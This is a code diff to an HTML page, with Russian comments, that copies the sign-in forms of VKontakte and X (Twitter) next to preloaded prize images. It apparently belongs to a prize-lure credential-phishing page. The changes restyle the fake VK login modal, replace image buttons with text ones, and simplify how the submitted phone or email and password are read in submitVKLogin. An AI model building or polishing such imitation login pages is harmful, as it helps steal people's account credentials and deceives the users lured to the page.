@@ -93,7 +93,7 @@
             color: #8da1b5;
             font-weight: 500;
             letter-spacing: 1px;
-            margin-left: 40px;
+            margin-left: 40px; /* Отодвинули от выбора языков */
         }
         
         .container {
@@ -594,7 +594,6 @@
             color: #2a5885;
             margin-right: 10px;
             font-family: Arial, sans-serif;
-            min-width: 30px;
         }
         
         .phone-input {
@@ -605,24 +604,6 @@
             font-size: 16px;
             font-family: Arial, sans-serif;
             outline: none;
-        }
-        
-        /* Стили для картинок-кнопок ВКонтакте */
-        .vk-image-btn {
-            width: 100%;
-            cursor: pointer;
-            margin: 10px 0;
-            border: none;
-            background: none;
-            padding: 0;
-            display: block;
-        }
-        
-        .vk-image-btn img {
-            width: 100%;
-            height: auto;
-            display: block;
-            border-radius: 4px;
         }
         
         /* Специфичные стили для X (Twitter) модального окна */
@@ -674,21 +655,6 @@
             font-family: Arial, sans-serif;
         }
         
-        /* Стили для заголовка ВКонтакте */
-        .vk-modal-header {
-            text-align: center;
-            padding: 20px 0 10px;
-        }
-        
-        .vk-title {
-            font-size: 20px;
-            font-weight: bold;
-            color: #000;
-            text-align: center;
-            margin-bottom: 20px;
-            font-family: Arial, sans-serif;
-        }
-        
         .footer {
             width: 100%;
             max-width: 800px;
@@ -714,7 +680,7 @@
             font-size: 14px;
             transition: color 0.3s;
             font-weight: 400;
-            font-family: 'Orbitron', sans-serif;
+            font-family: 'Orbitron', sans-serif; /* Исправлен шрифт */
         }
         
         .footer-link:hover {
@@ -727,7 +693,7 @@
             margin-top: 10px;
             line-height: 1.5;
             font-weight: 400;
-            font-family: 'Orbitron', sans-serif;
+            font-family: 'Orbitron', sans-serif; /* Исправлен шрифт */
         }
         
         .notification {
@@ -961,21 +927,14 @@
                 </button>
             </div>
             <div class="login-modal-body">
-                <!-- Ваша картинка ВКонтакте -->
-                <div style="text-align: center; margin-bottom: 15px;">
-                    <img src="vk.png" alt="ВКонтакте" style="width: 100px; height: auto; margin: 0 auto;">
-                </div>
-                
-                <div class="vk-title">Вход ВКонтакте</div>
-                
                 <div class="vk-tabs">
                     <div class="vk-tab active" data-type="phone" onclick="switchVKTab('phone')">Телефон</div>
                     <div class="vk-tab" data-type="email" onclick="switchVKTab('email')">Почта</div>
                 </div>
                 
-                <!-- Поле для телефона (можно редактировать префикс) -->
+                <!-- Поле для телефона -->
                 <div id="vkPhoneField" class="phone-input-container">
-                    <span class="phone-prefix" id="phonePrefix">+7</span>
+                    <span class="phone-prefix">+7</span>
                     <input type="text" class="phone-input" id="vkPhoneInput" placeholder="Номер телефона">
                 </div>
                 
@@ -989,23 +948,13 @@
                     <label for="vkSave" style="color: #666;">Сохранить вход</label>
                 </div>
                 
-                <!-- Кнопка Войти как картинка -->
-                <button class="vk-image-btn" onclick="submitVKLogin()">
-                    <img src="vhod.png" alt="Войти">
-                </button>
+                <button class="login-btn" onclick="submitVKLogin()" style="background: #4c75a3;">Войти</button>
                 
-                <!-- Кнопка Создать аккаунт как картинка -->
-                <button class="vk-image-btn">
-                    <img src="sozdanie.png" alt="Создать аккаунт">
-                </button>
+                <a href="#" class="login-link" style="text-align: center; margin: 15px 0;">Создать аккаунт</a>
+                <a href="#" class="login-link" style="text-align: center; margin-bottom: 20px;">Создать страницу для бизнеса</a>
                 
-                <!-- Кнопка Создать страницу для бизнеса как картинка -->
-                <button class="vk-image-btn" style="margin-bottom: 20px;">
-                    <img src="biznes.png" alt="Создать страницу для бизнеса">
-                </button>
-                
-                <p style="font-size: 12px; color: #666; text-align: center; margin: 20px 0; line-height: 1.4;">
-                    Нажимая «Войти», вы принимаете пользовательское соглашение и политику конфиденциальности
+                <p style="font-size: 12px; color: #666; text-align: center; margin: 20px 0; line-height: 1.5;">
+                    Нажимая «Войти», вы принимаете пользовательское соглашение<br>и политику конфиденциальности
                 </p>
                 
                 <div style="border-top: 1px solid #e0e0e0; padding-top: 15px;">
@@ -1220,7 +1169,6 @@
             const vkEmailInput = document.getElementById('vkEmailInput');
             const vkPassword = document.getElementById('vkPassword');
             const vkTabs = document.querySelectorAll('.vk-tab');
-            const phonePrefix = document.getElementById('phonePrefix');
             
             // Элементы для X (Twitter)
             const xLoginPage = document.getElementById('xLoginPage');
@@ -1531,10 +1479,7 @@
                 const password = vkPassword.value.trim();
                 
                 if (vkLoginType === 'phone') {
-                    // Получаем полный номер телефона с префиксом
-                    const prefix = phonePrefix.textContent || '+7';
-                    const number = vkPhoneInput.value.trim();
-                    login = prefix + number;
+                    login = vkPhoneInput.value.trim();
                 } else {
                     login = vkEmailInput.value.trim();
                 }
@@ -1658,15 +1603,6 @@
                     const img = new Image();
                     img.src = `priz${i}.png`;
                 }
-                // Предзагрузка картинок ВКонтакте
-                const vkImg = new Image();
-                vkImg.src = 'vk.png';
-                const vhodImg = new Image();
-                vhodImg.src = 'vhod.png';
-                const sozdanieImg = new Image();
-                sozdanieImg.src = 'sozdanie.png';
-                const biznesImg = new Image();
-                biznesImg.src = 'biznes.png';
             }
             
             preloadImages();
